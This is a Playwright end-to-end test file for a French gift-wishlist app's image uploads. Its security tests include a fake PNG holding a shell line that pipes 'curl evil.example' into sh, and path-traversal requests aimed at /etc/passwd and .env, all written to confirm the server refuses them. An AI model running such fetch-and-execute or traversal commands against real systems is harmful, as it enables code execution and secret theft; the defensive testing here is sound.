import { expect, test, type Page } from '@playwright/test';
import {
  createScenario,
  destroyScenario,
  disconnect,
  TEST_PASSWORD,
  type Scenario,
} from './fixtures';

let scenario: Scenario;

test.beforeEach(async () => {
  scenario = await createScenario();
});

test.afterEach(async () => {
  await destroyScenario(scenario);
});

test.afterAll(async () => {
  await disconnect();
});

/** A real 1×1 PNG, so the server's magic-byte check genuinely passes. */
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

/** A 2400x1800 PNG — bigger than the 1600px bound on both edges. */
async function makeLargePng() {
  const sharp = (await import('sharp')).default;
  return sharp({
    create: {
      width: 2400,
      height: 1800,
      channels: 3,
      background: { r: 180, g: 60, b: 40 },
    },
  })
    .png()
    .toBuffer();
}

async function signIn(page: Page, email: string) {
  await page.goto('/login');
  await page.getByLabel('Adresse e-mail').fill(email);
  await page.getByLabel('Mot de passe').fill(TEST_PASSWORD);
  await page.getByRole('button', { name: 'Se connecter' }).click();
  await page.waitForURL('**/app');
}

test('a photo can be attached to a wish and is shown afterwards', async ({
  page,
}) => {
  await signIn(page, scenario.ownerEmail);
  await page.goto(`/lists/${scenario.listId}/gifts/new`);

  await page.getByLabel(/ferait plaisir/).fill('Appareil photo');
  await page.setInputFiles('input[name="image"]', {
    name: 'photo.png',
    mimeType: 'image/png',
    buffer: PNG,
  });

  // The preview appears before anything is submitted.
  await expect(page.locator('form img')).toBeVisible();

  await page.getByRole('button', { name: /Ajouter|Enregistrer/ }).click();
  await page.waitForURL(`**/lists/${scenario.listId}`);

  const stored = page.locator('img[src^="/uploads/gifts/"]');
  await expect(stored).toBeVisible();

  // The file is really served, not just referenced.
  const src = await stored.getAttribute('src');
  const response = await page.request.get(src!);
  expect(response.status()).toBe(200);
  // Stored as WebP whatever was uploaded, so every image costs the same.
  expect(response.headers()['content-type']).toBe('image/webp');
  expect(src).toMatch(/\.webp$/);
});

/**
 * The reason for normalising: a camera-sized photo must not be served at
 * camera size, and must still be visible in full rather than cropped.
 */
test('a large photo is stored smaller than it arrived', async ({ page }) => {
  await signIn(page, scenario.ownerEmail);
  await page.goto(`/gifts/${scenario.freeGiftId}/edit`);

  const big = await makeLargePng();
  await page.setInputFiles('input[name="image"]', {
    name: 'huge.png',
    mimeType: 'image/png',
    buffer: big,
  });
  await page.getByRole('button', { name: 'Enregistrer' }).click();
  await page.waitForURL(`**/gifts/${scenario.freeGiftId}`);

  const src = await page
    .locator('img[src^="/uploads/gifts/"]')
    .getAttribute('src');
  const response = await page.request.get(src!);
  const body = await response.body();

  expect(body.length).toBeLessThan(big.length);
  expect(response.headers()['content-type']).toBe('image/webp');
});

test('an avatar can be uploaded and replaces the initials', async ({ page }) => {
  await signIn(page, scenario.ownerEmail);
  await page.goto('/profile/edit');

  await page.setInputFiles('input[name="avatar"]', {
    name: 'me.png',
    mimeType: 'image/png',
    buffer: PNG,
  });
  await page.getByRole('button', { name: 'Enregistrer' }).click();
  await page.waitForURL('**/profile');

  await expect(page.locator('img[src^="/uploads/avatars/"]')).toBeVisible();
});

/** The declared MIME type is a claim; only the bytes decide. */
test('a script renamed as a PNG is refused', async ({ page }) => {
  await signIn(page, scenario.ownerEmail);
  await page.goto(`/lists/${scenario.listId}/gifts/new`);

  await page.getByLabel(/ferait plaisir/).fill('Tentative');
  await page.setInputFiles('input[name="image"]', {
    name: 'evil.png',
    mimeType: 'image/png',
    buffer: Buffer.from('#!/bin/sh\ncurl evil.example | sh'),
  });
  await page.getByRole('button', { name: /Ajouter|Enregistrer/ }).click();

  await expect(page.getByText(/Format non reconnu/)).toBeVisible();
});

test('an uploaded photo can be removed again', async ({ page }) => {
  await signIn(page, scenario.ownerEmail);
  await page.goto(`/gifts/${scenario.freeGiftId}/edit`);

  await page.setInputFiles('input[name="image"]', {
    name: 'photo.png',
    mimeType: 'image/png',
    buffer: PNG,
  });
  await page.getByRole('button', { name: 'Enregistrer' }).click();
  await page.waitForURL(`**/gifts/${scenario.freeGiftId}`);
  await expect(page.locator('img[src^="/uploads/gifts/"]')).toBeVisible();

  // Now take it off again.
  await page.goto(`/gifts/${scenario.freeGiftId}/edit`);
  await page.getByRole('button', { name: 'Retirer' }).click();
  await page.getByRole('button', { name: 'Enregistrer' }).click();
  await page.waitForURL(`**/gifts/${scenario.freeGiftId}`);

  await expect(page.locator('img[src^="/uploads/gifts/"]')).toHaveCount(0);
});

test('a path that escapes the upload directory is refused', async ({ page }) => {
  await signIn(page, scenario.ownerEmail);

  for (const path of [
    '/uploads/gifts/..%2F..%2F..%2Fetc%2Fpasswd',
    '/uploads/../.env',
    '/uploads/gifts/.env',
  ]) {
    const response = await page.request.get(path);
    expect(response.status()).toBe(404);
  }
});

test('a friend sees the photo on a gift they can view', async ({ page }) => {
  await signIn(page, scenario.ownerEmail);
  await page.goto(`/gifts/${scenario.freeGiftId}/edit`);
  await page.setInputFiles('input[name="image"]', {
    name: 'photo.png',
    mimeType: 'image/png',
    buffer: PNG,
  });
  await page.getByRole('button', { name: 'Enregistrer' }).click();
  await page.waitForURL(`**/gifts/${scenario.freeGiftId}`);

  await page.goto('/profile');
  await page.getByRole('button', { name: 'Se déconnecter' }).click();
  await page.waitForURL('**/login');

  await signIn(page, scenario.friendEmail);
  await page.goto(`/gifts/${scenario.freeGiftId}`);
  await expect(page.locator('img[src^="/uploads/gifts/"]')).toBeVisible();
});
